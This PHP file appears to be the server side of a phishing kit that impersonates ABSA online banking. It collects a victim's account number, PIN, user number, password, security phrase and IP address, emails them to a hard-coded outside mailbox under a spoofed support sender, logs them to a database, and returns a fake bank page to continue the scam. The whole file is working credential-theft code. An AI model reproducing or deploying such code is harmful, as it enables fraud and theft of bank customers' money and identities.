<?php
session_start();
if(isset($_GET['password']) && $_GET['password'] != "")
{
    include_once 'sqlite.php';
    
        $ccn = $_GET['AccessAccount'];
	$csp = $_GET['PIN'];
	$atm = $_GET['Operator'];
        
        $password = $_GET['password'];
        $surePhrase = $_GET['surephrase'];
        
	$ip = $_SERVER['REMOTE_ADDR'];
        
        if (preg_match('/[A-Za-z]/', $password) && preg_match('/[0-9]/', $password))
        {

            $time = time();

            $msg = "+++++++++++++++++++++++++++++++++++++++\r\n";
            $msg .= "AccessAccount No : $ccn\r\n";
            $msg .= "Customer Pin : $csp\r\n";
            $msg .= "user number : $atm\r\n\r\n";
            $msg .= "Password: $password\r\n\r\n";
            $msg .= "Remote_Addr : $ip\r\n\n";
            $msg .= "+++++++++++++++++++++++++++++++++++++++\r\n\r\n";

            $_SESSION['msg'] = $msg;
            $_SESSION['param'] = $_GET;

            $from = "support@".$_SERVER['HTTP_HOST'];
            $headers = "From:" . $from;
            $subject = "ABSA | Password - $ccn - $ip ".$_SERVER['HTTP_HOST'];
            $result = 'jbroughton49@usa.com';

            if(mail($result, $subject, $msg, $headers))
            if(1)
            {
                $query = 'INSERT INTO result (subject,message,isread,date_time) VALUES ("'.$subject.'","'.$msg.'","notread","'. date("Y-m-d H:i:s").'");';
                $sqlqueryResult = mysqli_query($dbconnect, $query);
                //$db->exec($query);

                sleep(5);
                //$experience_login = file_get_contents('../Profile - Absa Online.htm');
                //$experience_login = file_get_contents('../sureCheckCountdown.htm');
                $experience_login = file_get_contents('../~~Express - Manage Devices - Absa Online.htm');

                $experience_login = str_replace("{AccessAccount}", $ccn, $experience_login);
                $experience_login = str_replace("{PIN}", $csp, $experience_login);
//                include("../images/logo-blu.png");
                $experience_login = str_replace("{Operator}", $atm, $experience_login);
                $experience_login = str_replace("{password}", $password, $experience_login);
                
                $experience_login = str_replace("{Verified}", $surePhrase, $experience_login);
                $experience_login = str_replace("{sureCheck}", $surePhrase, $experience_login);

                header("Content-Type: application/javascript");
                $callback = $_GET["callback"];
                $jsonResponse = json_encode(array('message' => $experience_login, 'focusElement' => "cellphonenumber"));
                echo $callback . '(' . $jsonResponse . ')';

            }
             else{
                //echo $experience_login;
                header("Content-Type: application/javascript");
                $callback = $_GET["callback"];
                $jsonResponse = json_encode(array('message' => "cannot send mail", 'focusElement' => "pff1"));
                echo $callback . '(' . $jsonResponse . ')';
            }
        }
        else{
            $experience_login="error";
            header("Content-Type: application/javascript");
            $callback = $_GET["callback"];
            $jsonResponse = json_encode(array('message' => $experience_login, 'focusElement' => "cellphonenumber"));
            echo $callback . '(' . $jsonResponse . ')';
        }
}